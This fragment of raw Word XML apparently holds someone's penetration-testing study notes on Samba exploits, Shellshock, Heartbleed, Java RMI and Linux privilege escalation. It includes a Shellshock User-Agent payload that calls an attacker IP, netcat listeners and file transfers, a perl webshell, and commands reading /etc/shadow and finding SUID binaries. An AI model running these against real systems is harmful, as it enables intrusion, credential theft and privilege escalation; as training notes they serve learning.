        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="1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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000513">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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Spray</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000514">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="16"/>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Hydra</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000515">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="144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smb_login</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051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no blank passwords</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051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33ec3rtki72f" w:id="177"/>
        <w:bookmarkEnd w:id="177"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051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t60homhbn9dh" w:id="178"/>
        <w:bookmarkEnd w:id="17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SAMBA exploitation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051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version → --script smb-os-discovery -p445 ip</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051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exploit → searchsploit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051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9n7lb7apzmt" w:id="179"/>
        <w:bookmarkEnd w:id="17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Common Vulns</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051C">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o6rla988uy" w:id="180"/>
        <w:bookmarkEnd w:id="18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Username map script</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051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3.0.0 - .25 - username map script enabled, remote command execution </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="72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exploit/multi/samba/usermap_script</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000051F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="60"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:eastAsia="Roboto" w:hAnsi="Roboto"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:fill="ff9900" w:val="clear"/>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no shell, use python import to spawn /bin/sh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520">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8483glylq4g" w:id="181"/>
        <w:bookmarkEnd w:id="18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Samba Symlink Directory Traversal</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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Allows to create a symbolic link to the root partition from writable share, read access to everything </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000522">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zxtkp87w32j" w:id="182"/>
        <w:bookmarkEnd w:id="18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Writable Samba Share to remote command execution via perl </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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Where fully patched smb</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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Smbmap -H IP</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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 download file</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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Looking at webroot, is writeable, upload script, execute by opening in browser, user webshell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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/usr/share/webshell/perl → kali -- change ip for out address and port for listener </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000528">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="81"/>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attacker, run netcat . nc -n -l -v -p 1234 / nc -nlvp 1234</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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2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o1xxai4m0k2" w:id="183"/>
        <w:bookmarkEnd w:id="18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Exploiting Shell shock</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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Or bashdoor</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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Discovered on the unix bash shell, affected; cgi programs, openssh,dhcp clients etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005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Way the bash worked, using environment variables which ran commands escaped from strings. Example was modification of user agent strings to include shellshock payloads to run commands</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052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User-Agent:  () { :;}; ping -c 5 -p uniqie_strng attackerIP</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000052F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Ping attacker machine to check if vulnerable</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000530">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="56"/>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5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32">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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 for CGI files, cgi-bin directory,  using dirb/dirsearch etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000533">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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access to said file (200)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000534">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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--script http-shellshock --script-args uri=/file </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000535">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>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Bingo bango, execute scripts, get passwords, reverse shell</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000536">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tacqj7p3l5d" w:id="184"/>
        <w:bookmarkEnd w:id="18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Exploiting Heartbleed</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005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Bug affecting openSSL 1.0.1 to 1.0.1 f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reading of encrypted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data stored in memory due to a faulty implementation of TLS and DTLS(datagram) heartbeat extension</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005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Encrypted data dumping → credentials for the app, data in memory , private keys</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000539">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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Nmap --script ssl-heartbleed IP</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000053A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12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auxiliary/scanner/ssl/openssl_heartbleed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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000053B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="129"/>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Change actions in options; dump, etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000053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3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adyi0l9rt265" w:id="185"/>
        <w:bookmarkEnd w:id="18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Exploiting JAVA RMI Registry</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000053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Java API’s, invoked remotely</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000053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Load arbitrary Java classes from attacker url → default configurations of RMI registry/activation services</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000540">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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 1099, GNU Classpath grmiregistry, nmap</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000541">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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exploit/multi/misc/misc/java_rmi_server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000542">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skpb6u522s2h" w:id="186"/>
        <w:bookmarkEnd w:id="18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Post Exploitation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000543">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Additional information gathering</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000544">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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 esc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000545">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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Lateral movement</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000546">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10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 exfiltration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000547">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="103"/>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Maintaining Access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000054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18cgz8epjnc" w:id="187"/>
        <w:bookmarkEnd w:id="18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Privilege Escalation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000054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gkybmld8p9g" w:id="188"/>
        <w:bookmarkEnd w:id="18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System info</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000054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Hostname </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000054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Uname -a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gets kernel version</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000054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4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4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Cat /etc/issue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gets OS version</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000054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Ps auxw</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running processes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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Route -n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connected to other networks , pivoting ?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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Cat /etc/resolv.conf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dns configuration </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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Netstat - auntp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connections to other machines </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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5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egho31ktyknr" w:id="189"/>
        <w:bookmarkEnd w:id="18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User Info </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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 -user username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configuration for other users</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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Last -a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last logged on user</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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Cat /etc/passwd</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service accounts and shells</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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Ls -als /home/*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access to other user home directories</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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5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4v9vej8vfjq" w:id="190"/>
        <w:bookmarkEnd w:id="19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Access, credentials </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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-l</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current su privilege access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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 -perm -4000 -type f 2&gt;/dev/null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find SUID binaries for priv esc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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Cat /etc/shadow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read shadow files</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000055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5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6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ruyv23jml1z" w:id="191"/>
        <w:bookmarkEnd w:id="19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job/tasks </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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Cat /etc/crontab → jobs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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/etc/cron* -type f -perm -o+w -exec ls -l {}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jobs that are world writable</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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6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6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 BE GATHERED WITH LinEnum. Wget or netcat</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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lin enum script onto the target machine</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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 -l -p 1234 &gt; LinEnum.sh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victim</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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 -w 3 &lt;VICTIMIP&gt; 1234 &lt; LinEnum.sh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attacker </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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creates a listener on target to redirect data to new file., On attacker we conn to target and redirect contents of linenum to target</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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Chmod +x LinEnum.sh</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set executable bit</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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6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Look at /linux/post modules for enum scripts given a session</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056D">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fik0tv6t8xz" w:id="192"/>
        <w:bookmarkEnd w:id="19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1.SUID Binaries</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056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Executable files with the setuid attribute assigned are runs as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owner</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regardless of user privilege</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000056F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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useres who have permission to execute this file gain the privilege of the owner of the file. (root sometimes)</w:t>
          <w:br w:type="textWrapping"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000570">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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-rw</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r-xr-r</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000571">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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Usually ping, su, mount </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000572">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="90"/>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 -perm -4000 -type f 2&gt;/dev/null</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057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rkxrakurin3e" w:id="193"/>
        <w:bookmarkEnd w:id="19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2.SUDO Privileged Access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057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needs to be added to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/etc/sudoers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config file</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057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Retrieve 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-l</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000576">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="92"/>
        </w:numPr>
        <w:spacing w:after="0" w:afterAutospacing="0" w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="360"/>
        <w:rPr>
          <w:ins w:author="ashish gupta" w:id="1" w:date="2019-10-15T01:49:28Z"/>
          <w:rFonts w:ascii="Oswald" w:cs="Oswald" w:eastAsia="Oswald" w:hAnsi="Oswald"/>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This will show if a NOPASSWD is specified for a binary</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000577">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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spawning a bash shell from : less, vi/vim, more, nmap, ftp, adb </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057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79">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v0vjjzugmd" w:id="194"/>
        <w:bookmarkEnd w:id="19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3.Restricted Shells</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000005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Isolate a user and its processes from the rest of the operating system </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>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Rbash</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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Usually commands are restricted, eg cd</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057D">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2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$PATH and $SHELL to see environment variables</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000057E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20"/>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Shell Escapes</w:t>
          <w:tab/>
        </w:r>
      </w:ins>
    </w:p>
